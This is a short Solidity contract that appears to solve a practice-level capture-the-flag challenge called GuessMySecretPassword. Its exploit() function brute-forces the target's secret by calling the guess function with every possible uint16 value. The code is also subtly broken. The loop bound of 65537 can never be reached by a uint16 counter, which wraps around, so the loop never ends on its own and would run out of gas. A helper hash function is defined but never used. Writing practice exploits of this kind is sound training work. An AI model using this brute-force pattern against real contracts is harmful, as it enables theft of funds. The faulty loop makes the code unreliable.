// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/GuessMySecretPassword.sol";

contract attackGuessMySecretPassword {
    GuessMySecretPassword originalContract;

    constructor(address _originalContract) public {
        originalContract = GuessMySecretPassword(_originalContract);
    }

    function crypt(uint16 nbr) public pure returns (bytes32) {
        return (keccak256(abi.encodePacked(nbr)));
    }

    function exploit() public {
        for (uint16 i = 0; i < 65537; i++) {
            originalContract.guessMySecretPassword(i);
        }
    }
}